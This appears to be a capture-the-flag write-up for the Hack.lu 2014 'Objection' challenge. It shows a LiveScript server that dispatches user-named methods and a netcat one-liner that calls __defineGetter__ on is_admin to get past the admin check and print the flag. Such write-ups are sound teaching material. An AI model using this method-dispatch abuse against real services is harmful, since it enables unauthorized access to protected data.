---
layout: post
title: "Hack.lu 2014 - Objection"
date: 2014-10-23 12:51
comments: true
author: darby
categories: web
---

## Challenge

This guard talks a weird dialect. And why does he talk in such a complicated
way?
[Download](https://wildwildweb.fluxfingers.net/static/chals/objection_4966674d17ff296939c0e3dfccfe87ed.co)

nc wildwildweb.fluxfingers.net 1408

## Analysis

Downloading the file gives us:

```coffeescript
const net = require \net
const BufferStream = require \bufferstream

admin_password = (require \fs).readFileSync \admin_password, \utf8


server = net.createServer (con) ->
  console.log 'client connected'
  con.write 'hello!\n'
  client_context =
    is_admin: false
    token: (require \fs).readFileSync \secret_token, \utf8
    login: ([password], cb) ->
      if password == admin_password
        cb "Authentication successful"
        @is_admin = true
      else
        cb "Authentication failed"
    get_token: ([], cb) ->
      if not @is_admin then return cb "You are not authorized to perform this action."
      cb "The current token is #{@token}"
  in_stream = new BufferStream {encoding:\utf8, size:\flexible}
  con.pipe in_stream
  <- in_stream.split \\n
  it .= toString \utf8
  console.log "got line: #{it}"
  [funcname, ...args] = it.split ' '
  if typeof client_context[funcname] != \function
    return con.write "error: unknown function #funcname\n"
  client_context[funcname] args, ->
    con.write "#it\n"

server.listen 1408, ->
  console.log 'server bound'
```

Clearly, we would like to get the token.  Calling `get_token()` requires knowing
the admin password.  The key thing to notice is the follow bit of code where
user input is parsed and used:

```coffeescript
  in_stream = new BufferStream {encoding:\utf8, size:\flexible}
  con.pipe in_stream
  <- in_stream.split \\n
  it .= toString \utf8
  console.log "got line: #{it}"
  [funcname, ...args] = it.split ' '
  if typeof client_context[funcname] != \function
    return con.write "error: unknown function #funcname\n"
  client_context[funcname] args, ->
    con.write "#it\n"
```

The first word of input is checked to be a function of the `client_context`
object.  Since this is turned into javascript, there will be many built-in
methods we could call besides `get_token()` and `login()`.

One method, `__defineGetter__` takes as parameters a property and a function
body.  By overriding `is_admin` with a null body, the check in `get_token()`
will not function as expected, and we will be able to see the token.

## Solution

```
$ echo -e "__defineGetter__ is_admin\nget_token" | nc wildwildweb.fluxfingers.net 1408
hello!
undefined
The current token is flag{real_cowboys_dont_use_object_create_null}
$
```
